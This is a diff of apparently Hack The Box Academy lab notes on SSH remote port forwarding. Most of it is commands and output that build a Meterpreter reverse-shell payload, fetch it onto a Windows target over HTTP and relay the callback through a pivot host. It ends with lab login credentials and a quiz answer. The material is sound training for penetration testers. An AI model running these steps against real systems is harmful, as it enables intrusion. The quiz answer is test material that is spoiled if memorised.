@@ -5,7 +5,7 @@ When a compromised Windows host (Windows A) can only communicate within its inte
 
 ### Creating a Windows Payload with msfvenom
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -18,7 +18,7 @@ Saved as: backupscript.exe
 
 ### Configuring & Starting the multi/handler
 
-```sh
+```shellsession
 msf6 > use exploit/multi/handler
 
 [*] Using configured payload generic/shell_reverse_tcp
@@ -36,7 +36,7 @@ msf6 exploit(multi/handler) > run
 ### Transferring Payload to Pivot Host
 Once our payload is created and we have our listener configured & running, we can copy the payload to the Ubuntu server using the `scp` command since we already have the credentials to connect to the Ubuntu server using SSH.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
 
 backupscript.exe                                   100% 7168    65.4KB/s   00:00
@@ -45,27 +45,27 @@ backupscript.exe                                   100% 7168    65.4KB/s   00:00
 ### Starting Python3 Webserver on Pivot Host
 After copying the payload, we will start a `python3 HTTP server` using the below command on the Ubuntu server in the same directory where we copied our payload.
 
-```sh
+```shellsession
 ubuntu@Webserver$ python3 -m http.server 8123
 ```
 
 ### Downloading Payload on the Windows Target
 
-```sh
+```shellsession
 PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
 ```
 
 ### Using SSH -R
 Once we have our payload downloaded on the Windows host, we will use **SSH remote port forwarding** to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. We will use `-vN` argument in our SSH command to make it verbose and ask it not to prompt the login shell. The `-R` command asks the Ubuntu server to listen on `<targetIPaddress>:8080` and forward all incoming connections on port `8080` to our msfconsole listener on `0.0.0.0:8000` of our attack host.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
 ```
 
 ### Viewing the Logs from the Pivot
 After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.
 
-```sh
+```shellsession
 ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
 debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
 debug1: channel 1: new [172.16.5.19]
@@ -84,7 +84,7 @@ debug1: channel 0: connected to 0.0.0.0 port 8000
 ### Meterpreter Session Established
 If all is set up properly, we will receive a Meterpreter shell pivoted via the Ubuntu server.
 
-```sh
+```shellsession
 [*] Started HTTPS reverse handler on https://0.0.0.0:8000
 [!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
 [*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
@@ -106,7 +106,7 @@ Our Meterpreter session should list that our incoming connection is from a local
 SSH to **10.129.2.213** (ACADEMY-PIVOTING-LINUXPIV), with user `ubuntu` and password `HTB_@cademy_stdnt!`
 1. Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x) **Answer: 172.16.5.129**
    - SSH to the pivot host and read the IP address of the ens224 NIC:
-        ```sh
+        ```shellsession
         $ ssh ubuntu@10.129.2.213
         ubuntu@WEB01:~$ ip a
         1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
